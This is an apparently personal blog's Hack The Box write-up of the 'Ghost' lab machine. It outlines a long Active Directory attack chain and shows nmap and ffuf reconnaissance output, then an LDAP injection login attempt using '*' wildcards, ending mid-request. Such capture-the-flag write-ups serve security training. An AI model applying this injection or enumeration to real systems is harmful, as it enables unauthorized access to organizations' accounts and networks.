<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Foued SAIDI">
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="http://fouedsaidi.com/2025/04/03/hackthebox-ghost/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
        <meta name="description" content="OverviewGhost is an insane-difficulty machine from Hack The Box dealing initially with LDAP injection -&gt; Gitea password bruteforce -&gt; source code review leading to RCE via acquiring a special he">
<meta property="og:type" content="article">
<meta property="og:title" content="Hackthebox: Ghost">
<meta property="og:url" content="http://fouedsaidi.com/2025/04/03/Hackthebox-Ghost/index.html">
<meta property="og:site_name" content="Foued Saidi&#39;s Blog">
<meta property="og:description" content="OverviewGhost is an insane-difficulty machine from Hack The Box dealing initially with LDAP injection -&gt; Gitea password bruteforce -&gt; source code review leading to RCE via acquiring a special he">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Ghost/Ghost.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Ghost/intranet.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Ghost/intranet1.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Ghost/gitea.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Ghost/gitea1.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Ghost/lfi.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Ghost/rce.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Ghost/rce1.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Ghost/dns.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Ghost/adfs.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Ghost/adfs1.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Ghost/adfs2.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Ghost/core.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Ghost/mssql.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Ghost/mssql1.png">
<meta property="og:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Ghost/trust.png">
<meta property="article:published_time" content="2025-04-03T11:29:40.000Z">
<meta property="article:modified_time" content="2025-04-05T06:44:31.747Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://fouedsaidi.com/images/HackTheBox/Machines/Ghost/Ghost.png">
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
    <meta name="theme-color" content="#5618ff">
    <link rel="shortcut icon" href="/images/logo.png">
    <!--- Page Info-->
    
    <title>
        
            Hackthebox: Ghost -
        
        Foued Saidi&#39;s Blog
    </title>
    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/assets/build/styles.css">

    

    
<link rel="stylesheet" href="/fonts/fonts.css">

    
<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">

    <!--- Font Part-->
    
    
    
    

    <!--- Inject Part-->
    
    <script id="hexo-configurations">
    window.config = {"hostname":"fouedsaidi.com","root":"/","language":"en"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"5px","image_alignment":"center","image_caption":true,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"Articles","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#5618ff","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Hello, I'm Foued SAIDI ðŸ‘‹","subtitle":{"text":[],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":50,"backing_speed":50,"starting_delay":500,"backing_delay":1200,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kujen5","instagram":"https://www.instagram.com/saidi.foued/","zhihu":null,"twitter":"https://twitter.com/_kujen5","email":"foued.saidi.pro@gmail.com","linkedin":"https://www.linkedin.com/in/foued-saidi-pro/","facebook":"https://www.facebook.com/foued.saidi.980/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/kujen5","LinkedIn":"https://www.linkedin.com/in/foued-saidi-pro/"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":2},"tags":{"enable":true,"limit":3}},"footerStart":"2023/12/22 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.0.0"></head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <span class="swup-progress-icon">
            <i class="fa-solid fa-circle-notch fa-spin"></i>
        </span>
    
</div>


<main class="page-container" id="swup">

    

    <div class="main-content-container">


        <div class="main-content-header">
            <header class="navbar-container">
    
    <div class="navbar-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Foued Saidi&#39;s Blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/"  >
                                    
                                        
                                            <i class="fa-regular fa-house"></i>
                                        
                                        HOME
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/archives"  >
                                    
                                        
                                            <i class="fa-regular fa-archive"></i>
                                        
                                        ARCHIVES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="" 
                                    href="/categories"  >
                                    
                                        
                                            <i class="fa-regular fa-folder"></i>
                                        
                                        CATEGORIES
                                    
                                </a>
                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class="has-dropdown" 
                                    href="#" onClick="return false;">
                                    
                                        
                                            <i class="fa-regular fa-user"></i>
                                        
                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
                                    
                                </a>
                                <!-- Submenu -->
                                
                                    <ul class="sub-menu">
                                    
                                        <li>
                                        <a href="/about">ME
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB
                                        </a>
                                        </li>
                                    
                                        <li>
                                        <a target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN
                                        </a>
                                        </li>
                                    
                                    </ul>
                                
                            </li>
                    
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile drawer -->
    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/"  >
                             
                                
                                    <i class="fa-regular fa-house"></i>
                                
                                HOME
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/archives"  >
                             
                                
                                    <i class="fa-regular fa-archive"></i>
                                
                                ARCHIVES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
                        href="/categories"  >
                             
                                
                                    <i class="fa-regular fa-folder"></i>
                                
                                CATEGORIES
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                    
            
                
                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
                        href="#" onClick="return false;">
                            
                                
                                    <i class="fa-regular fa-user"></i>
                                
                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
                            
                        </a>
                    </li>
                    <!-- Submenu -->
                              
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" href="/about">ME</a>
                            </li>
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/kujen5">GITHUB</a>
                            </li>
                        
                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
                                <a class="py-0.5" target="_blank" rel="noopener" href="https://www.linkedin.com/in/foued-saidi-pro/">LINKEDIN</a>
                            </li>
                        
                    
            

        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="main-content-body">

            

            <div class="main-content">

                
                    <div class="post-page-container">
    <div class="article-content-container">

        <div class="article-title relative w-full">
            
                <div class="w-full flex items-center pt-6 justify-start">
                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">Hackthebox: Ghost</h1>
                </div>
            
            </div>

        
            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
                    <img src="/images/logo.png">
                </div>
                <div class="info flex flex-col justify-between">
                    <div class="author flex items-center">
                        <span class="name text-default-text-color text-lg font-semibold">Foued SAIDI</span>
                        
                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
                        
                    </div>
                    <div class="meta-info">
                        <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-04-03 15:29:40</span>
        <span class="mobile">2025-04-03 15:29:40</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-04-05 10:44:31</span>
            <span class="mobile">2025-04-05 10:44:31</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/Hackthebox/">Hackthebox</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                    </div>
                </div>
            </div>
        

        


        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
            <h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>Ghost is an insane-difficulty machine from Hack The Box dealing initially with LDAP injection -&gt; Gitea password bruteforce -&gt; source code review leading to RCE via acquiring a special header -&gt; Kerberos ticket hijacking -&gt; BloodHound Information Gathering -&gt; DNS Spoofing to capture the NTLM hash of the user -&gt; ReadGMSAPassword abuse -&gt; Golden SAML Attack -&gt; ADFS web interface authentication bypass -&gt; MSSQL Command Injection -&gt; SeImpersonatePrivilege abuse using EfsPotato -&gt; Cross-domain Trust abuse -&gt; root flag.<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Ghost/Ghost.png"
                      alt="Ghost-info-card"
                ><figcaption>Ghost-info-card</figcaption></figure></p>
<h3 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h3><div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE               VERSION</span><br><span class="line"><span class="number">53</span>/tcp   open  domain                Simple DNS Plus</span><br><span class="line"><span class="number">80</span>/tcp   open  http                  Microsoft HTTPAPI httpd <span class="number">2.0</span> (SSDP/UPnP)</span><br><span class="line">|_http<span class="literal">-server-header</span>: Microsoft<span class="literal">-HTTPAPI</span>/<span class="number">2.0</span></span><br><span class="line">|_http<span class="literal">-title</span>: Not Found</span><br><span class="line"><span class="number">88</span>/tcp   open  kerberos<span class="literal">-sec</span>          Microsoft Windows Kerberos (server time: <span class="number">2024</span><span class="literal">-07-15</span> <span class="number">20</span>:<span class="number">47</span>:<span class="number">05</span>Z)</span><br><span class="line"><span class="number">135</span>/tcp  open  msrpc                 Microsoft Windows RPC</span><br><span class="line"><span class="number">139</span>/tcp  open  netbios<span class="literal">-ssn</span>           Microsoft Windows netbios<span class="literal">-ssn</span></span><br><span class="line"><span class="number">389</span>/tcp  open  ldap                  Microsoft Windows Active Directory LDAP (Domain: ghost.htb, Site: Default<span class="literal">-First-Site-Name</span>)</span><br><span class="line">|_ssl<span class="literal">-date</span>: TLS randomness does not represent time</span><br><span class="line">| ssl<span class="literal">-cert</span>: Subject: commonName=DC01.ghost.htb</span><br><span class="line">| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb</span><br><span class="line">| Not valid before: <span class="number">2024</span><span class="literal">-06-19T15</span>:<span class="number">45</span>:<span class="number">56</span></span><br><span class="line">|_Not valid after:  <span class="number">2124</span><span class="literal">-06-19T15</span>:<span class="number">55</span>:<span class="number">55</span></span><br><span class="line"><span class="number">443</span>/tcp  open  https?</span><br><span class="line"><span class="number">445</span>/tcp  open  microsoft<span class="literal">-ds</span>?</span><br><span class="line"><span class="number">464</span>/tcp  open  kpasswd5?</span><br><span class="line"><span class="number">593</span>/tcp  open  ncacn_http            Microsoft Windows RPC over HTTP <span class="number">1.0</span></span><br><span class="line"><span class="number">636</span>/tcp  open  ssl/ldap              Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default<span class="literal">-First-Site-Name</span>)</span><br><span class="line">| ssl<span class="literal">-cert</span>: Subject: commonName=DC01.ghost.htb</span><br><span class="line">| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb</span><br><span class="line">| Not valid before: <span class="number">2024</span><span class="literal">-06-19T15</span>:<span class="number">45</span>:<span class="number">56</span></span><br><span class="line">|_Not valid after:  <span class="number">2124</span><span class="literal">-06-19T15</span>:<span class="number">55</span>:<span class="number">55</span></span><br><span class="line"><span class="number">1433</span>/tcp open  ms<span class="literal">-sql-s</span>              Microsoft SQL Server <span class="number">2022</span> <span class="number">16.00</span>.<span class="number">1000.00</span>; RC0+</span><br><span class="line">|_ssl<span class="literal">-date</span>: <span class="number">2024</span><span class="literal">-07-15T20</span>:<span class="number">51</span>:<span class="number">35</span>+<span class="number">00</span>:<span class="number">00</span>; +<span class="number">1</span>m18s from scanner time.</span><br><span class="line">| ssl<span class="literal">-cert</span>: Subject: commonName=SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: <span class="number">2024</span><span class="literal">-07-15T20</span>:<span class="number">09</span>:<span class="number">33</span></span><br><span class="line">|_Not valid after:  <span class="number">2054</span><span class="literal">-07-15T20</span>:<span class="number">09</span>:<span class="number">33</span></span><br><span class="line">|_ms<span class="literal">-sql-info</span>: ERROR: Script execution failed (use <span class="literal">-d</span> to debug)</span><br><span class="line">|_ms<span class="literal">-sql-ntlm-info</span>: ERROR: Script execution failed (use <span class="literal">-d</span> to debug)</span><br><span class="line"><span class="number">2179</span>/tcp open  vmrdp?</span><br><span class="line"><span class="number">3268</span>/tcp open  ldap                  Microsoft Windows Active Directory LDAP (Domain: ghost.htb0., Site: Default<span class="literal">-First-Site-Name</span>)</span><br><span class="line">|_ssl<span class="literal">-date</span>: TLS randomness does not represent time</span><br><span class="line">| ssl<span class="literal">-cert</span>: Subject: commonName=DC01.ghost.htb</span><br><span class="line">| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb</span><br><span class="line">| Not valid before: <span class="number">2024</span><span class="literal">-06-19T15</span>:<span class="number">45</span>:<span class="number">56</span></span><br><span class="line">|_Not valid after:  <span class="number">2124</span><span class="literal">-06-19T15</span>:<span class="number">55</span>:<span class="number">55</span></span><br><span class="line"><span class="number">3269</span>/tcp open  ssl/globalcatLDAPssl?</span><br><span class="line">| ssl<span class="literal">-cert</span>: Subject: commonName=DC01.ghost.htb</span><br><span class="line">| Subject Alternative Name: DNS:DC01.ghost.htb, DNS:ghost.htb</span><br><span class="line">| Not valid before: <span class="number">2024</span><span class="literal">-06-19T15</span>:<span class="number">45</span>:<span class="number">56</span></span><br><span class="line">|_Not valid after:  <span class="number">2124</span><span class="literal">-06-19T15</span>:<span class="number">55</span>:<span class="number">55</span></span><br><span class="line"><span class="number">3389</span>/tcp open  ms<span class="literal">-wbt-server</span>         Microsoft Terminal Services</span><br><span class="line">|_ssl<span class="literal">-date</span>: <span class="number">2024</span><span class="literal">-07-15T20</span>:<span class="number">51</span>:<span class="number">32</span>+<span class="number">00</span>:<span class="number">00</span>; +<span class="number">1</span>m17s from scanner time.</span><br><span class="line">| ssl<span class="literal">-cert</span>: Subject: commonName=DC01.ghost.htb</span><br><span class="line">| Not valid before: <span class="number">2024</span><span class="literal">-06-16T15</span>:<span class="number">49</span>:<span class="number">55</span></span><br><span class="line">|_Not valid after:  <span class="number">2024</span><span class="literal">-12-16T15</span>:<span class="number">49</span>:<span class="number">55</span></span><br><span class="line"><span class="number">8008</span>/tcp open  http                  nginx <span class="number">1.18</span>.<span class="number">0</span> (Ubuntu)</span><br><span class="line">|_http<span class="literal">-server-header</span>: nginx/<span class="number">1.18</span>.<span class="number">0</span> (Ubuntu)</span><br><span class="line">|_http<span class="literal">-generator</span>: Ghost <span class="number">5.78</span></span><br><span class="line">|_http<span class="literal">-title</span>: Ghost</span><br><span class="line"><span class="number">8443</span>/tcp open  ssl/http              nginx <span class="number">1.18</span>.<span class="number">0</span> (Ubuntu)</span><br><span class="line">| tls<span class="literal">-alpn</span>:</span><br><span class="line">|_  http/<span class="number">1.1</span></span><br><span class="line">| ssl<span class="literal">-cert</span>: Subject: commonName=core.ghost.htb</span><br><span class="line">| Subject Alternative Name: DNS:core.ghost.htb</span><br><span class="line">| Not valid before: <span class="number">2024</span><span class="literal">-06-18T15</span>:<span class="number">14</span>:<span class="number">02</span></span><br><span class="line">|_Not valid after:  <span class="number">2124</span><span class="literal">-05-25T15</span>:<span class="number">14</span>:<span class="number">02</span></span><br><span class="line">|_http<span class="literal">-server-header</span>: nginx/<span class="number">1.18</span>.<span class="number">0</span> (Ubuntu)</span><br><span class="line">| http<span class="literal">-title</span>: Ghost Core</span><br><span class="line">|_Requested resource was /login</span><br><span class="line">Service Info: Host: DC01; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_c<span class="built_in">lock-skew</span>: mean: <span class="number">1</span>m15s, deviation: <span class="number">2</span>s, median: <span class="number">1</span>m16s</span><br><span class="line">| smb2<span class="literal">-security-mode</span>:</span><br><span class="line">|   <span class="number">311</span>:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2<span class="literal">-time</span>:</span><br><span class="line">|   date: <span class="number">2024</span><span class="literal">-07-15T20</span>:<span class="number">50</span>:<span class="number">40</span></span><br><span class="line">|_  start_date: N/A</span><br></pre></td></tr></table></figure></div>

<p>We can see that we have a windows machine that seems to be our <code>ghost.htb</code> domain controller (we can tell from the 88 kerberos port). Letâ€™s add entries for it in our <code>/etc/hosts</code> file.<br>We also have a couple web applications deployed on ports 8008 and 8443.</p>
<h4 id="Subdomain-enumeration-with-ffuf"><a href="#Subdomain-enumeration-with-ffuf" class="headerlink" title="Subdomain enumeration with ffuf"></a>Subdomain enumeration with ffuf</h4><p>Doing some subdomain enumeration using ffuf we find an interesting <code>intranet</code>:</p>
<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen\Desktop\Tools\ffuf_2.<span class="number">0.0</span>_windows_amd64&gt; .\ffuf.exe <span class="literal">-w</span> ..\SecLists<span class="literal">-master</span>\SecLists<span class="literal">-master</span>\Discovery\DNS\bitquark<span class="literal">-subdomains-top100000</span>.txt <span class="literal">-H</span> <span class="string">&quot;Host: FUZZ.ghost.htb&quot;</span> <span class="literal">-u</span> <span class="string">&quot;http://10.129.231.105:8008&quot;</span>  <span class="literal">-fs</span> <span class="number">7676</span></span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.0.0</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://10.129.231.105:8008</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: C:\Users\0xkujen\Desktop\Tools\SecLists-master\SecLists-master\Discovery\DNS\bitquark-subdomains-top100000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.ghost.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string"> :: Filter           : Response size: 7676</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[Status: 307, Size: 3968, Words: 52, Lines: 1, Duration: 3058ms]: [0:00:06] :: Errors: 0 ::</span></span><br><span class="line"><span class="string">    * FUZZ: intranet</span></span><br></pre></td></tr></table></figure></div>

<p>Letâ€™s add that to our <code>/etc/hosts</code> file.</p>
<h3 id="Web-Application-http-intranet-ghost-htb-8008"><a href="#Web-Application-http-intranet-ghost-htb-8008" class="headerlink" title="Web Application - http://intranet.ghost.htb:8008/"></a>Web Application - <a class="link"   target="_blank" rel="noopener" href="http://intranet.ghost.htb:8008/" >http://intranet.ghost.htb:8008/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/HackTheBox/Machines/Ghost/intranet.png"
                      alt="Web Application"
                ><figcaption>Web Application</figcaption></figure></p>
<p>We are prompted with a login interface. Since this web app is hosted on a domain controller, we should not rule out that it is using ldap for the login flow.<br>One of the most common ldap injections is using <code>*</code> both for username and password. Letâ€™s fire up our BurpSuite and do that:<br>This is the actual login request:</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span 